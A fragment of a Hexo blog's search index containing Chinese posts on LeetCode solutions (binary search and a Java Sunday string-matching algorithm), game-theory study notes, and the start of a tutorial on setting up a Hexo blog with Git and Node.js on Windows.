class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    left  = mid + <span class="number">1</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><div class="note warning"><p>不得不说位运算是个神器，时间消耗只有传统乘除法的<code>1/4</code>，同时位运算也是实现乘除法的一种办法。</p></div>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>28. 实现 strStr()--简单难度？</title>
    <url>/2020/03/07/28-%E5%AE%9E%E7%8E%B0-strStr-%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%EF%BC%9F/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><div class="note default"><p>给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回 -1。</p></div><a id="more"></a><h3 id="Sunday算法"><a href="#Sunday算法" class="headerlink" title="Sunday算法"></a>Sunday算法</h3><div class="note info"><p>这是一道字符串匹配的常见题型，常规算法两个for循环解决；但是，除了KMP这种不太容易手撕的算法外，Sunday算法可以说是一种非常容易理解和实现的算法。</p></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//sunday算法Java实现</span></span><br><span class="line">    <span class="keyword">int</span> MAXSIZE = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> moveLength[] = <span class="keyword">new</span> <span class="keyword">int</span>[MAXSIZE];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">        getMoveLength(needle);</span><br><span class="line">        <span class="keyword">int</span> len1 = haystack.length();</span><br><span class="line">        <span class="keyword">int</span> len2 = needle.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(needle==<span class="keyword">null</span>||<span class="string">""</span>.equals(needle))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len1) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(  ;j &lt; len2 &amp;&amp; i + j &lt; len1 &amp;&amp; haystack.charAt(i + j) == needle.charAt(j); ++ j);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(j &gt;= len2) <span class="keyword">return</span> i;</span><br><span class="line">            <span class="keyword">if</span>(i + len2 &gt;= len1)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            i+=moveLength[haystack.charAt(i + len2)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getMoveLength</span><span class="params">(String needle)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//关键！，根据256种字符类型而不是needle串中的字符确定移动步数</span></span><br><span class="line">        <span class="keyword">int</span> len = needle.length();   </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; MAXSIZE; ++ i)</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">            moveLength[i] = len + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;len ; ++ i)&#123;</span><br><span class="line">            moveLength[needle.charAt(i)] = len - i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h3><div class="note primary"><p>从前往后匹配，每次匹配过程的末尾的下一位去检查该字符是否存在于模式串中：</p><ol><li><p>若存在于模式串中，则返回<code>i</code>的移动步数<code>move=</code>模式串长度<code>-</code> 所在字符的位置最后一个出现位置</p></li><li><p>若不存在，则<code>move</code>=模式串长度<code>+</code>1</p></li></ol><p>算法本身其实很容易理解，主要在实现查询办法时需要注意，每次去模式串中查找某个字符效率会比较低下，且算法设计很冗余，较好的办法可以如上述代码，<strong>设计一个大小为<code>256</code>的数组</strong>，用于存储每个字符的移动步数，这样检索时不会有重复检索问题，效率会高不少。</p></div><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><div class="note warning"><p>缺点很明显，主要有两点：</p><ol><li><p>即已经匹配的部分字符串完全没有利用，被浪费。</p></li><li><p><code>Sunday</code>算法的效率受到匹配串和模式串的影响。</p><p>主串：baaaabaaaabaaaabaaaa</p><p>模式串：aaaaa</p><p>这个模式串使得move[a]的值为1，即每次匹配失败时，只让模式串向后移动一位再进行匹配。这样就让Sunday算法的时间复杂度飙升到了<code>O(m*n)</code>，即字符串匹配常规情况。</p></li></ol><p>此外，不得不吐槽的是，<code>Leetcode</code>官方认为这道题时简单题，给出的数据完全对Sunday算法不利，反而常规算法这道题效率更高。</p></div>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>博弈论学习（一）</title>
    <url>/2020/03/03/%E5%8D%9A%E5%BC%88%E8%AE%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h4 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h4><div class="note success"><ul><li>不要选择劣势策略。</li><li>理性的选择导致非最优结果。</li><li>想获得某些事物之前必定要试图做/了解他。</li><li>站在别人的立场上分析他们会怎么做。</li><li>耶鲁大学的学生很自私（2333）。</li></ul></div>]]></content>
      <categories>
        <category>课程学习</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo + GitPages + PicGo搭建你的第一个静态个人博客教程（踩坑实践）</title>
    <url>/2020/03/01/hexo-gitpages-picgo%E6%90%AD%E5%BB%BA%E4%BD%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><div class="note default"><p>心血来潮，都二十多岁的人了还没有一个自己的博客，确实说不过去，最近因为疫情原因也确实有了有史以来最长的一个寒假，除了学习<code>+</code>玩耍，我发现我越来越想要留下些属于自己的印记，或是记录，或是分享。不管怎么样，这是真正动笔的第一篇<code>blog</code>，一个全新的开始，加油吧！</p></div><a id="more"></a><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><h4 id="为什么是Hexo？"><a href="#为什么是Hexo？" class="headerlink" title="为什么是Hexo？"></a>为什么是<code>Hexo</code>？</h4><div class="note primary"><p>相信对博客或多或少了解的同学都知道<code>WordPress</code>，一款强大的也是普及率最高的个人博客平台，如今几乎各大云平台都提供一键部署功能，可以说在资金到位的情况下（服务器+域名的长期维护费用），<code>WordPress</code>很适合对blog刚刚入门的小白，是的，它简单、成熟且易用。</p><p>但作为学生党，本着能省则省外加多折腾的原则，拥有一款永久免费的blog当然是最吼的。那么<code>Hexo</code>便是这样一款博客框架。<span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL3poLWNuL2RvY3Mv">Hexo<i class="fa fa-external-link-alt"></i></span>是一个快速、简洁且高效的博客框架。<code>Hexo</code> 使用 <span class="exturl" data-url="aHR0cDovL2RhcmluZ2ZpcmViYWxsLm5ldC9wcm9qZWN0cy9tYXJrZG93bi8=">Markdown<i class="fa fa-external-link-alt"></i></span>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p></div><h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><div class="note info"><p>可能你现在并不知道什么叫做<strong><u>静态网页</u></strong>，不用着急，本教程完全带你从零开始搭建你的blog，你只需一步步根据教程往下走，直到你走完全程，你自然会明白这一切。</p><ul><li>使用平台：Windows。</li><li>下载并安装<span class="exturl" data-url="aHR0cDovL25vZGVqcy5vcmcv">Node.js<i class="fa fa-external-link-alt"></i></span>，点击选择符合你电脑的<strong>直装版本</strong>即可。</li><li>下载并安装<span class="exturl" data-url="aHR0cDovL2dpdC1zY20uY29tLw==">Git<i class="fa fa-external-link-alt"></i></span>，根据官方疯狂下一步即可。</li></ul></div><h4 id="使用Git-Bash安装并初始化Hexo"><a href="#使用Git-Bash安装并初始化Hexo" class="headerlink" title="使用Git Bash安装并初始化Hexo"></a>使用Git Bash安装并初始化Hexo</h4><div class="note info"><p>安装好Git之后，它会创建Git Bash和Git GUI两个程序，分别是终端和可视化版本，我们这里只需要用到Git Bash这个程序。</p><ul><li><p>第一步给你的博客建立一个本地仓库，推荐这样创建文件夹：<code>D/workspaces/</code></p></li><li><p>进入到<code>workspaces</code>文件夹，鼠标点击右键，选择Git Bash Here，弹出一个黑色命令框，那么一切就从这里开始了。</p></li><li><p>输入命令：<code>node -v</code>。顾名思义，这个命令用于检测刚刚你是否装好了node。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20200302195054.png" alt=""></p><p>如图所示，我这里已经装好了v12.16.1版本</p></li><li><p>接下来安装Hexo，输入命令：<code>npm install -g hexo-cli</code>。这里可能提示你没有安装npm命令，通常是因为你的node没有正确安装，输入<code>yum install -y nodejs</code>重新安装即可。</p></li><li><p>查看版本：输入<code>hexo -v</code>，见到如下场景，说明安装成功。</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/20200302201627.png" alt=""></p></li><li><p>初始化hexo：输入命令<code>hexo init myblog</code>。该命令会在当前目录下创建并初始化hexo的工作目录名为<code>myblog</code>。</p></li><li><p>首先使用命令<code>cd myblog</code>进入到该文件夹，然后输入命令<code>npm install</code>安装相关依赖。</p></li></ul></div><h4 id="构建你的本地Hexo博客"><a href="#构建你的本地Hexo博客" class="headerlink" title="构建你的本地Hexo博客"></a>构建你的本地Hexo博客</h4><div class="note success"><p>完成hexo初始化后，我们不妨尝试先看看我们的博客到底是怎么样子，继续在上面的GitBash窗口输入以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g&#x2F;&#x2F;构建hexo博客文件</span><br><span class="line">hexo s&#x2F;&#x2F;启动hexo本地服务器</span><br></pre></td></tr></table></figure><p>如此，在浏览器输入<code>localhost:4000</code>，如果看到hexo的博客首页，说明你的博客已经可以在本地运行了。</p></div>]]></content>
      <tags>
        <tag>实用教程</tag>
      </tags>
  </entry>
</search>
